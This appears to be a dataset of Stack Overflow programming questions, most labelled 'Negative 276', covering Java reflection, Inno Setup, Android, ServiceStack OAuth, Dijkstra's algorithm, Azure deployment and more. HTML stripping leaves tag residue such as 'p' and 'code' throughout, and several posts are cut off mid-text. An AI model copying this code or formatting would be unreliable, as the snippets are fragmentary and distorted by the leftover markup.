Negative 276 pThis is a question about how Java does reflection internally.p  pI have a abstract class sayp  precodeSuperClass codepre  pand two chlid classes from SuperClass,p  pcodeChildClass1code and codeChildClass2code.p  pcodeSuperClasscode defines a accesor method codegetValuecode although it dosent define the attribute value.p  pcodeChildClass1code and codeChildClass2code override the method codegetValuecode and both add an annotation codeMyAnnotationcode to the method, codeMyAnnotationcode is kept in runtime Its the codeOneToOnecode annotation.p  pIn my program I have an instance of codeChildClas1code and an instance of codeChildClass2code. I used reflection to obtain all methods from both objects.p  pAs expected I got two codegetValuecode methods in the resulting array, one for the codeSuperClasscode and one for the codeChildClasscode.p  pFor the instances of codeChildClass1code the codegetValuecode method that had codeMyAnnotationcode was marked as a accessor methodAccessor property  null but for instances of codeChildClass2code the method marked as an accessor didnt have the annotation was the codegetValuecode method of the parent class.p  pI couldnt understand why, eventually I changed the order in which methods were declared in codeChildClass2code There were more methods than just the accessors, namely I put all getters and setters at the begginging and codeChildClass2code was behaving as codeChildClass1code.p  pMy question is, stronghow does Java qualify methods as accessors in reflectionstrong, and further does the order in which methods are declared change the behavior of reflectionp

Of course most things never seem to do what I think, the joys of learningp  pAt any rate once I figured out that the script was never resuming I looked around for other ways to do this. Someone had mentioned codeos.execcode but from my very limited knowledge it looks like that is used to run something else from within the script. Then I tried the codethreading.Timercode function but that doesnt seem to do what I want either. Or I have no idea what Im doing, which is even more likely. And then Ive seen people mentioning threads and daemons and things that I have no idea about at all.p  pI was thinking maybe a for loop but that seems pretty amateurishpot meet kettle, and Im not sure how well that would even workif at all. p  precodetimeToSleep  SleepValue count  0  while count lt timeToSleep     count  1     time.sleep1 runscript codepre  pSo is there an easy way to set a script to stop running for a specific amount of time, run again, and then sleep until the next time I figure there must be a pretty simple way to do this, but I really have no clue.

I need to show message to the user to save the settings before closing the application when it was produced at least one unsaved changing.

Negative 276 pI have a program product which additionally installs Shell Extension to Windows Explorer. It made in C and uses .NET Framework v4.0. Shell extension are installing by Inno Setup during installation by using regasm.exe. Everything works fine until I want to install updated version of application.  The problem is I cant update shell extension dll because it loaded into explorers memory. Before installing Inno Setup shows me following messagep  pimg srchttpi.stack.imgur.com8TC2I.png altenter image description herep  pIt says installer needs to terminate Windows Explorer because it uses files which should be updated by installer. strongIt terminates explorer process but doesnt launch him again. Thats my first issue.strong p  pActually I dont want to force user shutdown explorer. But I dont know how to unload managed shell dll from explorers memory. If uninstall it by regasm.exe dll still remains in memory. In fact I cant even find place where this checking occurs because I received already made installation sources.p  pFilesInUse IssProc.dll addin for Inno Setup doesnt help because as soon I terminate windows explorer by this addin, explorer immediately restarts. p  pHow could I solve this issue How could I update shell extension dll with better user experience And maybe someone could give me a hint wheres that code which checks for files in use is placedp  pO and BTW Im using Windows 7 x64.p

Negative 276 pIve been reading for a while on how I can persist application settings over subsequent application loads. My application is a Winforms app.p  pI know there are several ways I can do this, and coming from a Delphi background I always used to use code.inicode files, but I can see XML is probably more flexible for my particular scenario.p  pIm considering two possible solutions for my application to persist its settings. Note that I cannot use the Properties.Settings method for storing my data because of two reasonsp  ul liThe data I need to persist is created dynamically, that is I may have 1,2,10 instances of my various classes at runtime note that each one has its own Nameli liSome of these classes I instantiate are created from a class library separate project which doesnt have a Settings section in my applicationli liI dont want to have to create 100s if not 1000s of settings in the Properties.Settings.li ul  pMy two possible solutions are as followsp  ol liCreate an abstract class to manage writing and retreiving settings by providing methods to codegetcode and codesetcode data, e.g. codeGetBooleanInstanceName,Setting, bool defaultcode and codeSetBooleanInstanceName,Settingcode. Each class that needs to be persisted can then implement this abstract class, so, when instantiated, reads its settings from the provided file and saves settings when specific properties change. li liMark my desired properties in each class as codeSerializablecode, and when instantiated, ensure the creating class object calls a codeLoadSettingsstring filenamecode method on the class which loads the desired codeSerializedcode settings from the supplied file, and writes updates when codeSaveSettingsstring filenamecode is called. I could be using an codeIPersistentcode interface for example, which my classes can implement.li ol  pI was hoping someone can point me to which method I should pursue.p  pNote that I need the ability to only persist certain properties in each instance of each class. I cannot see anyway of automating this, and will have to do this manually.p  pNote that these objects are instantiated at runtime, so I do knot know in advance what objects need to be persisted, only the specific properties within them. Consider the following examplep  pLets say I have a codeSerialcode class my own with some wrapper propertiesmethods etc around the codeSystem.IO.SerialPortcode class. The user, at runtime, may need 1,2,x number of serial ports available to them. I need some way to save the number of serial ports in use, and for each one, save their codeNamecode, codePortnumbercode, codeBaudcode, codeParitycode etc properties. p  pSo, given a XML file, I need to be able to read info that the application needs to create two serial ports, 1 called codeGPS1code and the other called codeGPS2code. For codeGPS1code the codePortnumbercode is codeCOM1code and for codeGPS2code the codePortnumbercode is codeCOM2code etc etc. p  pAlas, the amount of data to be serialized is significant, this is only an example. I can envisage storing in the realm of tens to hundreds of objectsinstances, each with ten or so settings.p  hr  pSome important features that I requirep  pThe functionality to optionally let the user choose the settings file, so that I provide the ability to create settings profiles which the user can load and save to separate files.  Each file can be moved from machine to machine. So, for example, if the user creates a profile on a PC, and then needs to change the PC out with another one, heshe can simply copy the file and load the same settings.p  pI typically only need to store primitive types codestringcode, codeintcode, codefloatcode, codebooleancode,etc, although obviously the ability to store more complex types is an advantage.p  pCan anyone point me in the right direction Or if my two solutions are not viable, suggest anotherp

Negative 276 pI have an android game on the market and Ive been getting crash reports of NullPointers when trying to use the canvas. I can assume its because codeSurfaceHolder.lockCanvascode is returning null, however it does this mid gameplay because based on where it crashes, codeSurfaceHolder.lockCanvascode returned a valid canvas at least once.p  pThis is difficult to debug because I cant recreate it on my own device, which makes me wonder if it has to do with specific devices. The only hint I have is that one of the devices it occurred on was a Nexus 7.p  pNOTE This is not the same problem as the similarnamed question by me.

I am using embedded resources and have an English resx file e.g MyPage.resx and the culture version e.g. MyPage.cyGB.resx. p  pThe problem is when I install this into a production environment it is not switching languages. I am baffled since I thought these embedded resources would be part of the main web application dll so it should have no trouble finding the matching resourcep  pI know it is definitely changing the culture on the current thread. It just isnt loading the matching resource.p  pThe application is installed using WIX without harvesting but I have included all files aspx etc. Previously it was using a satellite assembly and creating a resource dll in the bin folder with the culture name. I removed this as I am just using embedded resources as mentioned. Is the satellite assembly a requirement for this I am quite happy for them to be embedded.p  pI am really confused about how to resolve this so any advice would be very welcome.p  pThanksp

Negative 276 pI have a problem involving RMI Registry creation and obtention within the scope of a distributed processing tool. First of all, I will describe briefly my environmentp  pstrongENVIRONMENTstrongbr I need a background Java process to be executed permanently.

Negative 276 pIm currently developing a Wizardlike feature for my app in which every step model class is a subclass of a base WizardStep class. I just have three of them now but they will always be less than a dozen.p  pI have a WizardController to backend the actual wizard NSView and Im now facing the emproblemem of how to manage this polymorphic WizardStep class in the UI. Please note that I will do extensive use of Cocoa bindings for each of the step subclasses.p  pThree solutions came to mindp  p1 Create separate NSViews for every emtypeem of WizardStep, then create an equal number of NSObjectController and bind specific subclass properties between them. When the user moves into a step I will populate the emcontentem of the NSObjectController and show the view as a subview, of course in the Wizard view.p  p2 Create separate NSViews for every emtypeem of WizardStep, then create an single NSObjectController and bind all subclasses properties to it some of them will be emunavailableem depending on which type the controller content is. When the user moves into a step I will populate the emcontentem of the NSObjectController and show the view as a subview, of course in the Wizard view.p  p3 Create a NSTabView with a tab per each emtypeem of WizardStep, then create an single NSObjectController or use the wizard ViewController and bind all subclasses properties to it some of them will be emunavailableem as in solution 2. When the user moves into a step I will populate the emcontentem of the NSObjectController and set the selectedIndex property of the tab view depending on the particular step type.p  pI feel like solution 1 is the most correct and elegant but Im afraid it can be an emoverkillem many NSObjectController, many NSView. Solutions 2 and 3 feel like silly to me because of the emunavailableem bindings.p  pAny advice on how to proceedp  pThank you all, Peterp

When the CellEndEdit event happens, the call stack indicates that the WorkbookView calls ControlCollection.Remove....li liThis, in turn, causes the Form to give focus to another control on the page.  The page in question includes some TextEdit controls above the WorkbookView that are inherited from a base page.  The first TextEdit is given focus for a brief moment.li liValidation is set up on these TextEdits which ends up initiating a model update.  This wipes out what is in the WorkbookView because all this happens before the change in view is pushed to the model.li ul  h2Questionsh2  pIs there a way to stop the other controls from receiving focus before my WorkbookViews event handlers can push the views changes to the model  Or is there another way to handle this betterp  pPlease let me know if I can elaborate anywhere or explain myself better, thanksp  h2Updateh2  pI created a test application with one DevExpress TextEdit and one SpreadsheetGear WorkbookView.

Negative 276 pI just became aware that AWT  Swing under Java JDK 1.7 as of JDK 7u15 does not support Retina displays on Apple Macbook Pros.  Netbeans, for example, is nearly unbearable to use for more than a few minutes running on a Retina display and using JDK 1.7.  p  pThis has been somewhat addressed in a StackExchange question a hrefhttpapple.stackexchange.comquestions53741javaandmacretinasupportherea, and quoting one specific postp  blockquote   pApples Java 6 JRE will support HiDPI, however it is not currently supported by Oracles Java 7 JRE. It also doesnt work under the latest dev builds of Java 8. Swing and JavaFX apps are blurry on a Retinia MacBook. This is why IntelliJ still runs under Java 6.p blockquote  pMy question is more specific than what is asked by the OP of the above thread.p  pMy employer of less than a month uses Swing in all of its applications.  For several reasons we are interested in migrating to Java 7 from Java 6.  Within the last several days, another developer who is on Windows, moved our platform over to Java 7.  As Im running a retina Macbook Pro, I noticed the issue when I pulled the latest stable branch of our code.p  pI am new to Java with less than a year of experience in the community, hence my question Will the Java community be fairly responsive to this issue moving forward, or should a substantial delay be anticipated months to a year or more before Swing in Java 7 is compatible with Apple Retina displaysp

Negative 276 pI have been working on an app in iphone simulator for a number of weeks and it has been running well up until now, but all of a sudden has begun running very slow both when loading content and animations. I have not made any changes to my code since I last tested it successfully.p  pI tried restarting the simulator multiple times and removing the app and doing a completely clean rebuild, but no luck. I also checked my cpu usage through the monitor while the simulator is running and I am only using about 30 of my cpu and 40 of memory.p  pI fully understand that the simulator is never a quick as the device itself, but it seems strange that it has suddenly started running slow after such a long time, and by slow I mean less then a quater of its original speed.p

Negative 276 pSo I wrote a recursive algorithm for the problem of figuring out the least number of coins of a particular set of denominations possible to arrive at a given sum. The algorithm seems to work, but because its recursive, and calculates every possible option before choosing one or  the other, Im having a difficult time coming up with a way to print out the denominations used as well. So essentially I can calculate the least number of coins possible to use, but not emwhichem coins they are. Heres the code and the little main method Im using to drive it. Any suggestions of streamlining the algorithm itself would also be welcome.p  precodepublic class DynamicCoinChange       public static void mainString[] args          int[] denoms  1, 6, 10, 25         int numCoins  dynamicCoinChangedenoms, 18, 3         System.out.printlnnumCoins           public static int dynamicCoinChangeint[] denoms, int amt, int start          if amt  0  start lt 0              return 0          else if amt  1              return 1          else if denoms[start] gt amt                   dynamicCoinChangedenoms, amt, start1 lt                  1  dynamicCoinChangedenoms, amtdenoms[start], start ampamp                 dynamicCoinChangedenoms, amt, start1  0              return dynamicCoinChangedenoms, amt, start1          else              return 1  dynamicCoinChangedenoms,amtdenoms[start], start                codepre

Negative 276 pThere are several ways to layout web pages so they fit the browser viewport DOM codewindowcode. When I say fit I include changing the size of the fonts used and changing the width and perhaps heights of DIVs, IMGs, and other rendered elements, as well as allowing fluid movements of elements. The goal is to make the page look nice on all display devices, from tiny phones to big desktop screens. These layout ways include using CSS codeemcode and codecode sizes, wrapping of text and elements, and JavaScript run by the codeonloadcode and codeonresizecode events. Layout fitting can be made to work almost perfectly, crossbrowser, but a sophisticated result may be insensitive to browser zooming, since zooming changes the window width magically, which means without any browserindependent, reliable way to detect the zoom DOM and CSS standards ignore browser zooming. There is no way to detect the difference between a small window width due to a small device screen versus a small window width due to a large zoom factor. We want to handle these two cases differently, since visionimpaired users need the zoom factor to be honored.p  pHas anyone succeeded in fitting layout really well including changing font sizes in a way that respects zooming For example, if the user visits the page with a zoom of 200, initially only the upper left quarter of the page should be shown the rest being available by scrolling horizontally and vertically, while the same page would fit into the window perfectly for another user having their zoom set to 100.p

Negative 276 pIve got a custom converter that extends DateTimeConverter, which Ive registered for the java.util.Date class in my facesconfig.xml. Essentially all that the new converter is doing is adding a more descriptive message and passing it to the current context so that it can be displayed in the appropriate jspf.p  pFor one date field on the screen Im testing, everything works fine for the other two, my getAsObject method is never called. However, Ive added an hmessages tag for debugging and the other two date fields are throwing conversion errors, so theyre still attempting conversion somewhere. p  pTheres no difference I can find between the three fields they all use the same styleclasses, and each is backed by a java.util.Date. I think whats happening is that the second two are using the default converter, but Im not sure why. The fields are all dynamically created so I cannot add a tag in the jsp, but I did try explicitly setting the converter in my utility class where the component is created, but had the same issue.p  pAny ideas what I should look for I feel like its something small and obvious, but Im not seeing it.p  pstrongEDIT strong Theres really not that much going on with the parts I can easily copypaste.

I believe this URL is actually hitting our Controller class but this implementation isnt important.p  pThis web application isnt too fast when selecting data, it takes a couple seconds to aggregate the data. Now lets say I have selected codeAmericascode and codeUnited Statescode each of those makes an ajax call, filtering my data.p  pIf I select codeSan Franciscocode and then decide to select codeNew York Citycode instead, it will only give me the data for codeSan Franciscocode and not both of them, the checkbox is checked for both.p  pNow this makes sense to me since the .get calls are asynchronous. The first call is winning the race condition.p  pNevertheless, this has been reported as a bug and I need a solution on how to solve it.

Negative 276 pI am implementing a proofofconcept site that can be optionally linked with an external provider.  The external provider will be used to get some additional user data. The provider conveniently exposes authentication with OAuth 1.0a. p  pTo get the data, the user authenticates on the provider site and grant permission. Easy.p  pThe site uses ServiceStack. Users register and login using a codeCredentialsAuthProvidercode. I have looked at the docs on ServiceStack, explored the SocialBoostrapApi demo, and modeled my services accordinglyp  pFirst, I added a codeUsercode class, that will be serialized to my DB, to hold the additional data.p  pThen, I created a CustomUserSession, to override the codeOnAuthenticatedcode method.p  precodePlugins.Addnew AuthFeature gt new CustomUserSession, new IAuthProvider[]              new CredentialsAuthProvider          codepre  pMy codeOnAuthenticatedcode method is very similar to the one in the SocialBoostrapApi demo it walks through codesession.ProviderOAuthAccesscode and gets the necessary info out of them looking for the OAuthTokens of the ExternalProvider provider.p  pOf course, this means that when the user gives authorization to my app on the external provider, in the OAuth callback I get the accesstoken, secret, everything, and I put it inside codesession.ProviderOAuthAccesscode.p  pThis, of course, works fine for the current session, but if the user logs off and on again, it has to authorize again get a new access token. p  pI need some way to save the data I put in session to a DB I tried to look around but found nothing see also a hrefhttpstackoverflow.comq17813438863564my question herea.p  pSo, I added code to save them directly to the DBp  precodevar userOAuthProvider  oauthTokens.TranslateToltUserOAuthProvidergt userOAuthProvider.UserAuthId  user.Id this.TryResolveltIDbConnectionFactorygt.Rundb gt db.SaveuserOAuthProvider  codepre  pNow, when the user authenticates, it seems that ServiceStack gets all the tokens for this UserAuthId and put them inside session. Goodp  h2First questionh2  pAm I doing it in the correct wayp  h2Second questionh2  pCan I get rid of the codeUsercodecodeCustomUserSessioncode classes, and just store the additional info I need in the Items dictionary in codeUserOAuthProvidercodecodeOAuthTokenscode That would make my code simpler..p  h2Third questionh2  pAt the end of codeOnAuthenticatecode, codeSocialBootstrapApicode saves the custom User table againp  precodeauthService.TryResolveltIDbConnectionFactorygt.Rundb gt db.Saveuser codepre  pWhy is it necessary I suppose it is to copy back some info from the codeUserOAuthProvidercode table on the User table at the next login after a new authorization, for example, but why The session seems to be already initialized with the correct data.p

Negative 276 pI want to have the family of classes which all have the same method. As this method is quite simple I want to make it final static, something likep  precodeclass A     public static final String createSth     codepre  pin fact this method returns only String.p  pSometimes it would be useful to uppercast all those A, B, C classes with the same method.

For each table I created a separate class, and as a result of createSth method I want to return sql creating a table for this class.p  pInterfaces does help neither.p  pThe only solutions seems to be to remove abstract modifier from createSth method in Mother class. But then Im not allowed to uppercast to Mother class and to call createSth method for children. So I have to remove static modifier for children classes.p  pConcluding why abstract method is not allowed to be static Ok here I can even understand that, but either why non static abstract method is not allowed to be replaced by static method in child classp

Negative 276 pIm in a bit of a rut and considering a switch from SQL to NoSQL. Im a bootstrap developer who is wellversed in MySQL looking for a potential alternative when considering a project with lots of adhoc metadata. Ive done a lot of research regarding the trending NoSQL alternatives but Im not certain if theyre worth the switch. Most discussions are about topics I cant consider such as scalability and performance it would be a dream to do so. With a little background information maybe someone can help me out a bit.p  pRight now Im considering setting up MySQL in a typical 3rd normal form and then having separate tables as keyvalue for the necessary metadata, if not just adopting keyvalue entirely. The reason being not all objects will have the same data and the data is variable. Therefore I cant plan a definite design, and even if I could the same research has pointed to me that it may not be worth the effort i.e. keydata is just easier. This is by far my quickest option since implementation is immediate and gives me a bit of everything. My concern here is that Im not confident reducing everything down to keyvalue is necessary but Ill have the comfort of MySQL.p  pAs alternatives Im considering either Cassandra or MongoDB to treat everything as an object with accompanying metadata. I feel this may be cleaner than my MySQL solution. Cassandra is appealing that it retains some familiarity of SQL with its CQL and seems easier to get into as a result. MongoDB has that appeal of JSON BSON where I feel like Ill be working with objects documents and not a table. It feels more intuitive to my needs as a result. From here my consideration is what kind of querying Ill be able to do given my shift from a RDMS  it seems I lose some luxury here with both Cassandra and MongoDB.p  pMy major concern then is if its worth the switch from MySQL just on the grounds of how Im storing amp accessing the data. While it was very enlightening to read about nonRDMS resources which really changed how I view data I cant say neither Cassandra nor MongoDB have really sold me on their utility in my situation, especially considering the time needed to learn and test new technology.p  pGiven my concerns, would it be wise to consider a switch or would I be justified in sticking with MySQLp

Negative 276 pRecently I wrote a little program, nothing noteworthy, mostly to test out some new things I found that dont really fit any real life application at the time. One of these things was using UUIDs instead of sequencegenerated by the underlying Oracle database IDs for my Hibernate entities.p  pA colleague of mine argued that this would be bad design and probably has negative effects on the system per se that the IDs are not delivered by the database, ie lose of control or performance not generating the UUIDs, but on the database side, handling them. Are there any points supporting this claim or is it mumbojumbo I mean, the generator is supplied by Hibernate, its not like someone must have thought its a good idea, also getting rid of the sequences seems to be a good tradeoff, not that theyre bad, more that they feel like overhead.p

Negative 276 blockquote   pAvoidance requires that the system will never enter an unsafe state, so an algorithm must pick a safe sequence of events and processes for execution. One such algorithm is the resourceallocation graph algorithm. A claim edge Pi  Rj indicates that process Pi may request resource Rj which is represented by a dashed line.

Negative 276 pI am writing a tester for a program that is basically a game implemented on the terminal. User types in commands, it prints responses, etc. To test it I want to use a program to print commands more or less at random and then pipe that to the program being tested. Save the output from the program into a file and have the tester save the commands it gives. That creates a log that if something bad happened you can see what series of commands caused it. This is pretty simple to dop  precode.tester  .program gt results.out codepre  pBut for the less random part it would help to be able to actually see the responses from the program and use scanf or something to pull out information on the game state ie The tester sends the command to show the cards in hand, and then does some kind of logic to decide on the next command to send.p  pBased on a hrefhttpstackoverflow.comquestions5129276howtoredirectstdoutof2ndprocessbacktostdinof1stprocessthis questiona and others, creating the loop itself seems pretty simplep  precodemkfifo fifo .tester lt fifo  .program gt fifo rm fifo codepre  pBut just doing it didnt work so in order to simplify the issue Ive made two c programs.

So then I tried putting an if statement in the codetextViewDidChangeSelectioncode sayingp  precodeSelected text is the selected text created in the method  textViewDidChangeSelection.  if selectedText.length gt 0  Do stuff   codepre  pThis works fine except that when the user backspaces, the if statement is passed because for some reason the selectedText is the character that gets deleted therefore codelengthgt0code.

Negative 276 pI have an Android app that happens to be running in the background on the users Android phone, while the user is speaking on a phone call that someone placed to the user.  At a certain point, my app would like to silence the audio from the phone call and play its own audio.  Moreover, Id like to do this without disrupting the users speech.p  pWhat permission does my app need to have, to do this  Is there any permission thats available to thirdparty apps that is sufficient to let my app do thisp  pIt looks like codeAudioManager.setStreamMuteSTREAMVOICECALL, truecode will mute the audio output from the voice call.  But I cant tell what permission this needs its not listed in the Android API documentation, or in a hrefhttppscout.csl.toronto.edu relnofollowthe Pscout permission mapa.  Also, I cant tell if there any restrictions on using this API from an app running in the background, on any version of Android.p  pIf the problem statement wasnt clear Alice has installed my app on her phone.  Bob calls Alice.  Alice picks up the call and is talking to Bob.  At a certain point, my app wants to completely mute Bobs voice and play its own audio clip instead, so Alice hears the audio clip instead of anything that Bob says.  But, I dont want to turn off the microphone on Alices phone if Alice is saying anything, that should still be picked up over the call and Bob should still hear it on the phone call.p

Negative 276 pIve implemented basic RBAC functionality in my application using Yii. There are roles, tasks and operations set up and working fine. p  pWhat Im trying to accomplish is the following on user login, check if the user is privileged to log in to this certain area of my application. Theres a operation assigned to this particular task. The problem, however, is that the preferred method of checking is the user is permitted to use a operation is emCWebUsercheckAccessem, which isnt available in the login as the Yii login workflow goes like thisp  ul liThe user provides information needed for authentication. li liAn identity instance is created with the userprovided information. li liCall IUserIdentityauthenticate to check if the identity is valid. li liIf valid, call CWebUserlogin to login the user, and Redirect the user browser to returnUrl. li liIf not valid, retrieve the error code or message from the identity instance and display it.li ul  pa hrefhttpwww.yiiframework.comdocapi1.1CWebUsercheckAccessdetail relnofollowtaken from hereap  pThe CWebUser instance available globally via emYiiappuserem is not propagated while in the login state, list items two and three which makes perfect sense to me. However, in order to call checkAccess Id need a CWebUser instance. CAuthManager doesnt seem to provide the functionality I need as it is theres no method for checking if a user has a certain atomic permission operation or list all of them. In my example, the operation needed is mostly always assigned in conjunction with a role, but who knows  somebody might just have access to this one operation of logging in, which is a case I want to cover.p  pstrongthanks a lotstrongp

Negative 276 pIm currently working on a form in access whose Record Source is supposed to be from a Temporary Table that should be generated at codeFormLoadcode and deleted when the form is closed.p  pThe way I have it working now is that the Record Source is set to another permanant table, and when the form loads, the temporary table is generated and the record source is changed. When the form is closed, the code sets the Record Source back to whatever it was originally. This works pretty well.p  pHowever, occassionally something goes wrong, and for one reason or another, the Record Source property doesnt get switched back, though the temp table is deleted so when I try to load the form, I get the errorp  blockquote   pThe record source TempTable specified on this form or report does not existp blockquote  pIt turns out that this error occurs even before codeFormLoadcode is called so I cant prepare for it before hand. The only way I can think of fixing this is trying to reset it when a button on my Home form is pressed, however this isnt optimal, since I still want to be able to open it from other locations.p  pIs there any way to catch this error and fix it without having to go into the form properties and change the record source any time something goes wrongp

Negative 276 pThis question is not a duplicate of fusing nested loops. The OP wants to do a reduction of a maximum value and at the same time store two indices.

Negative 276 pDo the Linux glibc pthread functions on x8664 act as fences for weaklyordered memory accesses pthreadmutexlockunlock are the exact functions Im interested in.p  pSSE2 provides some instructions with weak memory ordering nontemporal stores such as movntps in particular. If you are using these instructions and want to guarantee that another threadcore sees an ordering, then I understand you need an explicit fence for this, e.g., a sfence instruction.p  pNormally you do expect the pthread API to act as a fence appropriately.  However, I suspect normal C code on x86 will not generate weaklyordered memory accesses, so Im not confident that pthreads needs to act as a fence for weaklyordered accesses.p  pReading through the glibc pthread source code, a mutex is in the end implemented using lock cmpxchgl, at least on the uncontended path.  So Im guessing that what I need to know is does that instruction act as a fence for SSE2 weaklyordered accessesp

Negative 276 pI want to install my C project WinForm .NET v2 on windows 7,8,8.1 without the need of installing the .NET . p  pAs i figured out, Windows 7 has .NET v2 by default and Windows 8,8.1 has .NET v4 by default.p  pSo I was thinking of copying my C project and have them compiled with both .NET v2 and v4. After that, I would make an NSIS setup with both of them using a script that could tell me which version of .NET is installed on destination system. Then just install the specific compiled project without the need of installing any .NETp  pThe idea is theoretically OK but the problem isp  pI found no one using this solution for their projects.  What is wrong with it Do i miss somethingp

Negative 276 pDijkstras algorithm can be used to find, in OV log V  E, the shortest path from a node to any other node in a Graph G  V, E, where V denotes vertices and E edges, together with a nonnegative weight function w.p  pI recently worked on a variant with stronglimitedstrong edge weight, such that wn lt k. This algorithm is possible in OV  E, and is usually proved using edge expansion by inserting additional helper nodes.p  pHowever, I tried a different approach and showed the result by using a minheappriority queue that is able to perform all required operations namely emExtractMinem and emDecreaseKeyem in O1 instead of the usual Olog n.p  pMy proof was rejected as impossible without a clear explanation why, however, the TA indicated that the proof might actually be correct. We agreed on several points already, the remaining part to be shown is if a minheap with both operations in O1 is possible.p  pIm putting this question up both to understand if this is actually possible and how it can be proven.p

Therefore, there are two methods, one to change picture using countdowntimer and another to change picture using onClick method corresponding to imagebutton. p  pThe problem Im running into is the code provided in the link method called from within an onclick method is supposed to change the image, set a bool value to false, wait 1.5 seconds, and then change the same bool value back to true. p  pWhile the bool value is true, the method that changes the pictures is supposed to be skipped but thats not the case and I dont know why but i think its something to do with the code in the gists I created below. p  pSo the issue I have is when the button is clicked, the image changes as expected but it sometimes changes again too quickly due to the first method not recognizing that the player responded and thus shouldnt change image yet.  p  pPlease let me know if any further details or anything is needed and thank you again for time and helpp  pa hrefhttpsgist.github.comcjayem13d32446ceb8c6d9626c68fileeasyfragmentjava relnofollowhttpsgist.github.comcjayem13d32446ceb8c6d9626c68fileeasyfragmentjavaa a hrefhttpsgist.github.comcjayem13d32446ceb8c6d9626c68 relnofollowhttpsgist.github.comcjayem13d32446ceb8c6d9626c68ap  pa hrefhttpsgist.github.comcjayem13d0a0b124dfe17666be25fileeasyfragmentjava relnofollowhttpsgist.github.comcjayem13d0a0b124dfe17666be25fileeasyfragmentjavaa a hrefhttpsgist.github.comcjayem13d0a0b124dfe17666be25 relnofollowhttpsgist.github.comcjayem13d0a0b124dfe17666be25ap  precode onclick delayedRandomCuefinal long a  codepre

I currently have a function that combines the field values into an array and returns a variable known as strongemduplicateemstrong if the voucher was typed in previously. The goal is to then select the input with the greatest ID i.e. alphanumerically voucher10 would be greater than voucher8 and null the field containing this duplicate while displaying a No duplicates allowed message.p  pMy duplicate variable function is working perfectly and it returns the duplicate value immediately using code.oninput, functioncode. I also have the message displaying whenever I type a duplicate value. The problem Im having is selecting even one input that matches the duplicate value. If I inspect the inputs in browser, there appears to be no DOM representation of my typed value. I could type ninja in 3 or 4 fields and it would never show. Because of that, it seems I cant select the inputs based on value.p  pI would rather not loop through each voucher and check individually. It seems like jQuery could inspect all inputs that contain ninja and then I could use code.valcode to null it out. This is tricky as the HTML attribute value never changes. Any ideasp  pHere is my code that finds the duplicate within the array in case anyone needs it however the primary focus is selecting an HTML input whose value attribute never changes.

But, other than that nothing happens within the app. I tried to Reset the Contents and Settings. It works at times. But, it has stopped working now. I have even tried restarting my iMac but no luck.

Were an online assessment company and this script in general applies in our test player, rather than in our question editor, so we cant make change in the html, as you normally would with a text input box.p  pI know the maxlength attribute can be added through use of jQuery by using something along the lines of    input.propmaxLength, 3p  pHowever, I do not know how I would reference this in the HTML, as it would only be used in a couple of questions that use this script so making it standard for these questions by adding it to the JavaScript used is not an option.p

Negative 276 pI am working on an order program similar to the self checkout counters at supermarkets.  While an order is being created, each line item is an object and is kept in an arraylist.br The LineItem class has two variables  ItemID and ItemQuantity.  A method, incQuantity is used to increment the quantity by 1. I have no problem creating the arraylist and adding lineItems to it, but am not able to call the incQuantity method to be used when additional items with the same ItemID are encountered. I am using a get, remove, and add sequence to update the object. It seems to me that there must be a way to access the object directly and call the incQuantity method without the overhead of removing it from the arraylist and adding it again. See test code below.p  precode public static class LineItem     private String ItemID      private int ItemQuantity      public LineItemString ID        ItemID  ID       ItemQuantity  1  upon first occurrence of an item, qty is initialized to 1      public void incQuantity       ItemQuantity       private static void TestItems          ArrayList ltLineItemgt orderSheet  new ArrayListltLineItemgt         LineItem newLine  new LineItem12345         orderSheet.addnewLine          newLine  new LineItem121233445         orderSheet.addnewLine          newLine  new LineItem129767345         orderSheet.addnewLine          newLine  new LineItem5454120345         orderSheet.addnewLine          newLine  new LineItem0987123125         orderSheet.addnewLine          newLine  new LineItem65561276345         orderSheet.addnewLine           Increment Quantity of Element 0 below         LineItem updateLine  orderSheet.get0         updateLine.incQuantity         orderSheet.remove0         orderSheet.addupdateLine   codepre

from Step 1li ol  pHeres a stronglengthy breakdownstrong of what is supposed to occur...p  pThere are several elements to the presentation  ignore the top region with Our professional services... cycling through, and the bottom region with an RSS feed ticking over. p  pIm using the emCycle2em script to handle effects on multiple list items and codefadeTocode in preference of codefadeIncode and codefadeOutcode to bring the main elements in and out of the sequence.p  pIn the middle region, I am cycling through a list of client names in large white text  this is working fine. p  pThen, after a codestartDelaycode period, I fade out the white names, pause that cycle, then fade up a container which includes a list of images of each company director. p  pEach directors image fades in, holds for 5 seconds, then fades out, creating a ripple effect.p  pWhen the last directors image fades out, I fade out the container and immediately fade up another container which includes an animated carousel of each director with their bios. p  pWhen the bios sequence completes, its container fades out, the client names fade back up and resume cycling, and a codecycleDelaycode begins, to postpone the directors image sequence before it runs again. p  pSo far, I thought I had everything chained correctly but I cannot resolve a problem with the directors images sequence.p  pAfter two cycles of the directors images sequence, followed by the bios sequence, the third cycle of the images begins, except this time, instead of the ripple effect playing as normal, the first list image begins to fade back up as the second list image begins its fade out, producing a staggered effect in what should be a smooth ripple. This continues to get worse as the presentation cycles through each sequence. p  pI think that this sequence is being triggered repeatedly, such that there becomes multiple instances of it running  testing on Chrome, eventually the browser will crash.p  pIve tried everything from codesetIntervalcode and codesetTimeoutcode to codewhencode, codepromisecode, codedonecode, etc. etc. etc. and the problem remains.

Negative 276 pI have a Git repository which contains an ASP.net application and a PHP application, each in its own subdirectory under the root of the Git  repository. I would like to create two websites in Azure websites and deploy each of these applications to one of those websites. I can deploy the ASP.net application with no problem by setting the project variable in the settings panel on the website properties to the path to the CS project file. However I cannot successfully get the PHP site to deploy. I have tried setting the WWWroot directory, but Azure is still trying to build the csproj file even though it is not specified by the variable on that website, nor is it present in the root directory of the Git repository.

Negative 276 pRecently I have lost my database files after server Qnap reboot. I need to recover the MYD files. Im using the Photorec to recover my files which uses file signatures.p  pI know that MYD files doesnt have common file signature.p  pIve recreated the database from the earlier backup on local machine just to check if the signature changes when new data inserted and it seams like the signature bit is not changing. Im not sure if that means I have the signature of the file that Im looking for. Ive tried to create a photorec.sig file and entered MYD 0 0x00010065fe00000100003101aa70010f00 which are the first 34 chars of the hexdump result. Ive saved this file into the current working directory and .photorec.sig and tried to recognize the MYD file with fidentifystatic which always returns unknown.p  pI think there is something wrong with the signature file that Ive created. Can anyone tell me how to make sure that the signature file is created correctly and placed to the right place on qnapp

